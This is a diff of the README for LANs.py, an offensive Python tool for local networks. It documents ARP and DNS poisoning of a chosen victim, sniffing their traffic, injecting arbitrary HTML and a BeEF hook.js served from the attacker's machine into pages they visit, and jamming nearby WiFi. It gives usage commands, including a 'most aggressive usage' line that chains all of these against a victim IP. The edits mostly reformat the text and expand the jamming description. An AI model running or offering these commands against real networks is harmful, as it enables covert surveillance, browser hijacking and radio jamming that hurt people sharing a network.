@@ -1,14 +1,13 @@
 LANs.py
 ========
 
-Automatically find the most active WLAN users then spy on one of them and/or inject arbitrary HTML/JS into pages they visit. Technically: multithreaded asynchronous packet parsing/injecting ARP/DNS poisoner.
+* Automatically find the most active WLAN users then spy on one of them and/or inject arbitrary HTML/JS into pages they visit. 
+    * Individually poisons the ARP tables of the target box, the router and the DNS server if necessary. Does not poison anyone else on the network. Displays all most the interesting bits of their traffic and can inject custom html into pages they visit. Cleans up after itself.
 
-Individually poisons the ARP tables of the target box, the router and the DNS server if necessary. Does not poison anyone else on the network. Displays all most the interesting bits of their traffic and can inject custom html into pages they visit. Cleans up after itself.
-
-Also can be used to continuosly jam nearby WiFi networks. This has an approximate range of a 1 block radius, but this can vary based off of the strength of your WiFi card. 
+* Also can be used to continuosly jam nearby WiFi networks. This has an approximate range of a 1 block radius, but this can vary based off of the strength of your WiFi card. This can be fine tuned to allow jamming of everyone or even just one client. (Cannot jam WiFi and spy simultaneously) 
 
 
-Prereqs: Linux, python-scapy, python-nfqueue (nfqueue-bindings 0.4-3), aircrack-ng, python-twisted, BeEF (optional), nmap, nbtscan, and a wireless card capable of promiscuous mode if you choose not to use the -ip option
+Prerequisites: Linux, python-scapy, python-nfqueue (nfqueue-bindings 0.4-3), aircrack-ng, python-twisted, BeEF (optional), nmap, nbtscan, and a wireless card capable of promiscuous mode if you choose not to use the -ip option
 
 Tested on Kali 1.0. In the following examples 192.168.0.5 will be the attacking machine and 192.168.0.10 will be the victim.
 
@@ -24,10 +23,10 @@ Python LANs.py  [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC]
                 [--directedonly] [--accesspoint ACCESSPOINT]
 ```
 
-Usage
+#Usage
 -----
 
-### Common usage:
+#### Common usage:
 
 ``` shell
 python LANs.py -u -p
@@ -50,7 +49,7 @@ python LANs.py -u -p -d -ip 192.168.0.10
 -ip: target this IP address and skip the active targeting at the beginning
 
 
-### HTML injection:
+#### HTML injection:
 
 ``` shell
 python LANs.py -b http://192.168.0.5:3000/hook.js
@@ -66,7 +65,7 @@ python LANs.py -c '<title>Owned.</title>'
 Inject arbitrary HTML into pages the victim visits. First tries to inject it after the first `<head>` tag and failing that, injects prior to the first `</head>` tag. This example will change the page title to 'Owned.'
 
 
-### Read from pcap:
+#### Read from pcap:
 
 ``` shell
 python LANs.py -pcap libpcapfilename -ip 192.168.0.10
@@ -75,7 +74,7 @@ python LANs.py -pcap libpcapfilename -ip 192.168.0.10
 To read from a pcap file you must include the target's IP address with the -ip option. It must also be in libpcap form which is the most common anyway. One advantage of reading from a pcap file is that you do not need to be root to execute the script.
 
 
-### DNS spoofing
+#### DNS spoofing
 ``` shell
 python LANs.py -a -r 80.87.128.67
 ```
@@ -86,18 +85,21 @@ Example 1: The -a option will spoof every single DNS request the victim makes an
 
 Example 2: This will spoof the domain eff.org and subdomains of eff.org. When there is no -r argument present with the -a or -dns arguments the script will default to sending the victim to the attacker's IP address. If the victim tries to go to eff.org they will be redirected to the attacker's IP.
 
-### Most aggressive usage:
+#### Most aggressive usage:
 
 ``` shell
 python LANs.py -v -d -p -n -na -set -a -r 80.87.128.67 -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10
 ```
 
-
-### All options:
+#### Jam all WiFi networks:
 
 ``` shell
-python LANs.py -h
+python LANs.py
 ```
+
+### All options:
+-----
+
 Normal Usage:
 
   * -b BEEF_HOOK_URL: copy the BeEF hook URL to inject it into every page the victim visits, eg: -b http://192.168.1.10:3000/hook.js
